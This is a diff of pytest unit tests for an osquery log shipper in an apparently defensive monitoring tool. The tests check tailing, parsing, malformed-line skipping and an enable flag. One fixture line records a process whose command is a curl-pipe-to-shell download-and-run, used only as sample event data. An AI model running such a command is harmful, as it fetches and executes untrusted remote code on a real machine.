@@ -1,169 +1,116 @@
-"""
-Tests for ingestion shipper and schemas.
+"""Unit tests for the ingestion shipper and its lifespan gate.
 
 Covers:
-- LogWriter initialization
-- NormalizedEvent validation
-- FileShipper checkpoint handling
+- FileShipper tails a log file and ships parsed osquery events to the writer
+  (rotation/offset behaviour is exercised in db-writer tests; here we prove
+  the end-to-end tail → parse → write loop).
+- maybe_create_shipper returns None when disabled and a shipper when enabled
+  (without needing a Postgres pool).
 """
+from __future__ import annotations
 
-from datetime import datetime, timezone
-from unittest.mock import patch
+import asyncio
+import json
 
 import pytest
 
-from src.db.writer import LogWriter
-from src.ingestion.schemas import NormalizedEvent
+from src.ingestion import runner, shipper
+from src.ingestion.runner import maybe_create_shipper
+from src.ingestion.shipper import FileShipper
 
 
-class TestLogWriter:
-    """Test LogWriter class (from src.db.writer)."""
-
-    def test_init(self):
-        """LogWriter should initialize with default values."""
-        writer = LogWriter()
-        assert writer is not None
-
-
-class TestNormalizedEvent:
-    """Test NormalizedEvent schema."""
-
-    def test_create_minimal_event(self):
-        """Should create a minimal event with required fields."""
-        event = NormalizedEvent(
-            timestamp=datetime.now(tz=timezone.utc),
-            host_name="server01",
-            source="syslog",
-            event_category="process",
-            event_type="start",
-            raw_data={"original": "data"},
-        )
-        assert event.host_name == "server01"
-        assert event.source == "syslog"
-
-    def test_create_full_event(self):
-        """Should create an event with all fields."""
-        now = datetime.now(tz=timezone.utc)
-        event = NormalizedEvent(
-            timestamp=now,
-            host_name="server01",
-            source="syslog",
-            event_category="authentication",
-            event_type="login",
-            event_action="logon",
-            user_name="admin",
-            process_name="sshd",
-            process_pid=1234,
-            source_ip="10.0.0.1",
-            destination_ip="10.0.0.2",
-            destination_port=22,
-            file_path="/var/log/auth.log",
-            file_hash="abc123def456",
-            severity="high",
-            raw_data={"key": "value"},
-            enrichment={"threat_intel": {"match": True}},
-        )
-        assert event.user_name == "admin"
-        assert event.source_ip == "10.0.0.1"
-        assert event.enrichment["threat_intel"]["match"] is True
-
-    def test_optional_fields_default_none(self):
-        """Optional fields should default to None."""
-        event = NormalizedEvent(
-            timestamp=datetime.now(tz=timezone.utc),
-            host_name="server01",
-            source="syslog",
-            event_category="process",
-            event_type="start",
-            raw_data={},
-        )
-        assert event.user_name is None
-        assert event.source_ip is None
-        assert event.destination_ip is None
-        assert event.process_name is None
-        assert event.file_path is None
-
-    def test_enrichment_default(self):
-        """Enrichment should default to empty dict."""
-        event = NormalizedEvent(
-            timestamp=datetime.now(tz=timezone.utc),
-            host_name="server",
-            source="syslog",
-            event_category="process",
-            event_type="start",
-            raw_data={},
-        )
-        assert event.enrichment == {}
-
-    def test_raw_data_required(self):
-        """raw_data should be required."""
-        with pytest.raises(Exception):
-            NormalizedEvent(
-                timestamp=datetime.now(tz=timezone.utc),
-                host_name="server",
-                source="syslog",
-                event_category="process",
-                event_type="start",
-            )
-
-    def test_severity_optional(self):
-        """Severity should be optional."""
-        event = NormalizedEvent(
-            timestamp=datetime.now(tz=timezone.utc),
-            host_name="server",
-            source="syslog",
-            event_category="process",
-            event_type="start",
-            raw_data={},
-        )
-        assert event.severity is None
+def _process_line(name: str = "python3", cmdline: str = "python3 -m pytest") -> str:
+    return json.dumps(
+        {
+            "name": "processes",
+            "hostIdentifier": "test-mac.local",
+            "calendarTime": "Mon Mar 21 12:00:00 2026 UTC",
+            "unixTime": 1774267200,
+            "columns": {
+                "pid": "1234",
+                "name": name,
+                "path": f"/opt/homebrew/bin/{name}",
+                "cmdline": cmdline,
+                "uid": "501",
+            },
+            "action": "added",
+        }
+    )
 
 
-class TestFileShipper:
-    """Test FileShipper checkpoint handling."""
+class FakeWriter:
+    """Minimal stand-in for LogWriter — records events, never touches a DB."""
 
-    def test_checkpoint_load_handles_missing_file(self):
-        """Should return 0 if checkpoint file missing."""
-        from src.ingestion.shipper import FileShipper
+    def __init__(self) -> None:
+        self.events: list = []
 
-        writer = LogWriter()
-        shipper = FileShipper("/nonexistent/path.log", writer)
-        assert shipper._offset == 0
+    async def write(self, event) -> None:  # noqa: D401 - mirrors LogWriter.write
+        self.events.append(event)
 
-    def test_checkpoint_load_handles_invalid_content(self, tmp_path):
-        """Should return 0 if checkpoint content is invalid."""
-        from src.ingestion.shipper import FileShipper
 
-        writer = LogWriter()
-        # Write invalid checkpoint
-        invalid_file = tmp_path / "checkpoint"
-        invalid_file.write_text("not_a_number")
+@pytest.mark.asyncio
+async def test_shipper_tails_and_ships(tmp_path, monkeypatch):
+    log_file = tmp_path / "osqueryd.results.log"
+    log_file.write_text(_process_line("python3") + "\n")
 
-        with patch("src.ingestion.shipper.CHECKPOINT_FILE", invalid_file):
-            shipper = FileShipper("/tmp/fake.log", writer)
-            assert shipper._offset == 0
+    # Redirect the checkpoint away from ~ so the test is hermetic.
+    monkeypatch.setattr(shipper, "CHECKPOINT_FILE", tmp_path / "ckpt")
 
-    def test_checkpoint_load_valid(self, tmp_path):
-        """Should load valid checkpoint."""
-        from src.ingestion.shipper import FileShipper
+    writer = FakeWriter()
+    ship = FileShipper(str(log_file), writer)  # type: ignore[arg-type]
+    task = asyncio.create_task(ship.run())
 
-        writer = LogWriter()
-        checkpoint = tmp_path / "checkpoint"
-        checkpoint.write_text("12345")
+    # First poll (≤1s interval) reads the line already in the file.
+    await asyncio.sleep(1.2)
+    assert len(writer.events) == 1
+    assert writer.events[0].process_name == "python3"
 
-        with patch("src.ingestion.shipper.CHECKPOINT_FILE", checkpoint):
-            shipper = FileShipper("/tmp/fake.log", writer)
-            assert shipper._offset == 12345
+    # Append a second line — the shipper must pick it up on the next poll.
+    with open(log_file, "a") as f:
+        f.write(_process_line("bash", "bash -c 'curl http://x | sh'") + "\n")
+    await asyncio.sleep(1.2)
+    assert len(writer.events) == 2
+    assert writer.events[1].process_name == "bash"
 
-    def test_checkpoint_save(self, tmp_path):
-        """Should save checkpoint."""
-        from src.ingestion.shipper import FileShipper
+    ship.stop()
+    task.cancel()
+    try:
+        await asyncio.wait_for(task, timeout=2)
+    except (asyncio.CancelledError, asyncio.TimeoutError):
+        pass
 
-        writer = LogWriter()
-        checkpoint = tmp_path / "checkpoint"
 
-        with patch("src.ingestion.shipper.CHECKPOINT_FILE", checkpoint):
-            shipper = FileShipper("/tmp/fake.log", writer)
-            shipper._offset = 9999
-            shipper._save_checkpoint()
-            assert checkpoint.read_text() == "9999"
+@pytest.mark.asyncio
+async def test_shipper_skips_malformed_lines(tmp_path, monkeypatch):
+    log_file = tmp_path / "osqueryd.results.log"
+    log_file.write_text("not json {{{\n" + _process_line("python3") + "\n")
+    monkeypatch.setattr(shipper, "CHECKPOINT_FILE", tmp_path / "ckpt")
+
+    writer = FakeWriter()
+    ship = FileShipper(str(log_file), writer)  # type: ignore[arg-type]
+    task = asyncio.create_task(ship.run())
+    await asyncio.sleep(1.2)
+
+    # Malformed line is logged-and-skipped; the valid line still ships.
+    assert len(writer.events) == 1
+    assert writer.events[0].process_name == "python3"
+
+    ship.stop()
+    task.cancel()
+    try:
+        await asyncio.wait_for(task, timeout=2)
+    except (asyncio.CancelledError, asyncio.TimeoutError):
+        pass
+
+
+def test_maybe_create_shipper_disabled_by_default(monkeypatch):
+    monkeypatch.setattr(runner.settings, "enable_ingestion_shipper", False)
+    assert maybe_create_shipper(FakeWriter()) is None  # type: ignore[arg-type]
+
+
+def test_maybe_create_shipper_enabled(monkeypatch, tmp_path):
+    monkeypatch.setattr(runner.settings, "enable_ingestion_shipper", True)
+    monkeypatch.setattr(runner.settings, "osquery_log_path", str(tmp_path / "x.log"))
+    ship = maybe_create_shipper(FakeWriter())  # type: ignore[arg-type]
+    assert ship is not None
+    assert isinstance(ship, FileShipper)
